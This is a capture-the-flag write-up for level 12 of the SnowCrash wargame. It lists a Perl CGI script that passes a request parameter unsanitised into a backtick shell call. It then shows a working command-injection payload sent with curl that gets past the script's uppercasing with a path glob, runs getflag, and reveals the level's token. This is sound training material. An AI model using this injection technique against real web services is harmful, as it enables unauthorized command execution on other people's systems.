# Snow-crash - level12

* A script perl, who run a server on localhost at 4646 port
    - Server use CGI like previous level
```perl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```
* Set injection file who will display token while execution
```bash
level12@SnowCrash:~$ echo "/bin/getflag | wall " > /tmp/GETFLAG
level12@SnowCrash:~$ curl 'localhost:4646?x=$(/*/GETFLAG)'
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 11:55 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr 
```